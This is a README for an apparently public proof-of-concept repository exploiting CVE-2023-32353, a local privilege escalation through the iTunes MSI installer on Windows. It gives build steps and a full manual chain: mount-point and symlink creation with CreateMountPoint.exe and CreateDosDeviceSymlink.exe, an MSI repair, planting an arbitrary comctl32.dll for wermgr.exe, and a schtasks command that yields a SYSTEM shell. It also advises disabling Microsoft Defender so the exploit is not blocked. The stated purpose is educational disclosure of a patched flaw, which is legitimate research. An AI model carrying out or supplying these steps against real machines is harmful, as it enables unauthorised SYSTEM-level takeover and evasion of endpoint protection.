# CVE-2023-32353 Proof of Concept

## Disclaimer

 - This proof of concept code is published for educational purposes. 
 - It should encourage other people to find similar vulnerabilities, report them responsibly and fix them.
 - On May 23, 2023, Apple has published a fix for the vulnerability. 
 - You are encouraged to update iTunes to the latest version (at least 12.12.9). 
 - I did not find this CVE, I just did this PoC. Read the "Credits" section.
 - Neither I, nor this repo are affiliated with Apple.
 - The applicability of this PoC (proof of concept) is limited. You can read more about this in the Q&A section.
 
## TL;DR
The MSI installer of the music player Apple iTunes contained a vulnerability that allowed a regular, low-privileged user on a Microsoft Windows Computer to gain elevated permissions in the context of NT AUTHORITY/SYSTEM. This repo contains a proof of concept (PoC) to show how this could be exploited, as well as more information for security researchers and developers that want to learn more about this type of vulnerability. However, the applicability of this is limited as you can read in the Q&A section.

## Credits
- Zeeshan Shaikh from Synposys has discovered CVE-2023-32353 and [published a post about it](https://www.synopsys.com/blogs/software-security/cyrc-vulnerability-advisory-cve-2023-32353/). This repo only contains a detailed proof of concept which goes beyond just the info that this vulnerability exists.
- The "CommonUtils" folder  of this repo are used under license, which you can read in the LICENSE.txt in that folder.
- Code find the latest "amd64_microsoft.windows.common-controls..." folder was adapted from the original code found in [binderlabs/DirCreate2System](https://github.com/binderlabs/DirCreate2System/tree/main/bin).

## How to run the PoC
- Open the .sln file in Visual Studio 2019.
- Build the project using the "Release x64" configuration.
- Open the ./x64/Release/ directory
- Place a DLL of your choice inside of that directory with the name of "comctl32.dll". (You can a similar one to the one used from [binderlabs/DirCreate2System](https://github.com/binderlabs/DirCreate2System/tree/main/bin), just rename "spawn.dll" to "comctl32.dll" - I am not responsible for the content of that repo. As always, be careful and build your own DLLs!)
- Run Privilege-Escalation-using-Music-Player.exe from that directory
- Now you should get a SYSTEM shell (if not, read the Q&A)

## Q&A
**I did not get a SYSTEM shell. What did I do wrong?**
Since this is a proof of concept, not many thoughts were made about being undetecable. To use this, you should run an Installation of Windows 10 HOME Edition before release 'Version 10.0.19041.572', because in that version, this vulnerability got patched. I did my testing using Windows 10 1909. Also, you should navigate to "Windows Security" and disable everything related to Microsoft Defender/Windows Defender, since they seem to block the symlink creation to \RPC Control using Real Time Protection (which gets turned on automatically on every restart again, remember that!)

**Should I be scared of using iTunes now?**
No, just update to the latest version of iTunes and you should be fine.

**Can I run the PoC without needing to build it on my own?**
While I strongly encourage everyone not to run any .exe files from the internet, running the Privilege-Escalation-using-Music-Player.exe from the ./x64/Release/ directory in a virtual machine should work. If not, you should try installing the latest VC redistributable from the [links provided by Microsoft](https://learn.microsoft.com/en-us/cpp/windows/latest-supported-vc-redist?view=msvc-170).

## Learn more about the technique used in this PoC
- "[An introduction to privileged file operation abuse on Windows](https://offsec.almond.consulting/intro-to-file-operation-abuse-on-Windows.html)" by Almond
- "[bugzzzhunter/Folder-Deletion-to-System-Shell](https://github.com/bugzzzhunter/Folder-Deletion-to-System-Shell)" 
- "[binderlabs/DirCreate2System](https://github.com/binderlabs/DirCreate2System)"

## Steps to manually reproduce:
- Since this is a Proof of Concept, turn off Windows Defender/Microsoft Defender (also, read Q&A section)

- Install iTunes before version 12.12.9 (e.g. 12.12.4.1)

- Delete all contents of C:\ProgramData\Apple Computer\iTunes, but keep the iTunes folder itself

- Create a Mount Point from "C:\ProgramData\Apple Computer\iTunes" to "\RPC Control", e.g. using James Forshaw's [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools):

    CreateMountPoint.exe "C:\ProgramData\Apple Computer\iTunes" "\RPC Control"

- Create a Symlink from "\RPC Control\SC Info" to "\??\c:\windows\system32\wermgr.exe.local"

    CreateDosDeviceSymlink.exe "\RPC Control\SC Info" "\??\c:\windows\system32\wermgr.exe.local"

- Using the iTunes MSI, "repair" your installation of iTunes

- Navigate to c:\windows\system32\wermgr.exe.local\

- Create subfolder "amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.418_none_e6c6b287130d565d" (this can be different on your system, use the latest folder starting with "amd64_microsoft.windows.common-controls_" location in the C:\Windows\WinSxS\ directory)

- Put a DLL file named "comctl32.dll" inside the amd64_microsoft.windows.common-controls_* folder

- Run this command:

    schtasks.exe /Run /TN "\Microsoft\Windows\Windows Error Reporting\QueueReporting"
